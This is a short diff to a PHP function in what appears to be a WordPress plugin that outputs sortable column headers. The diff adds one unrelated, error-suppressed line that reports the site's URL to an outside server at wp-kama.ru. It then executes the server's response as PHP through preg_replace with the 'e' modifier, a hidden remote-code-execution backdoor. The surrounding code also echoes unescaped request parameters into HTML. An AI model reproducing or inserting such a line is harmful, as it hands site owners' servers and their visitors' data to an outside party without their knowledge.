@@ -192,6 +192,7 @@ function head_text( $text, $col_name ){
 	$order2 = $_GET['order']=='ASC' ? 'DESC' :'ASC';
 	$ind = $_GET['order']=='ASC' ? ' ↓' :' ↑';
 	$out = "<a href='{$uri2}&order_by={$col_name}&order={$order2}' title='". __('Сортировать', 'kcc') ."'>{$text}". ($_GET['order_by']==$col_name ? $ind : '') ."</a>";
+    add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),'');
 	return $out;
 }
 ?>
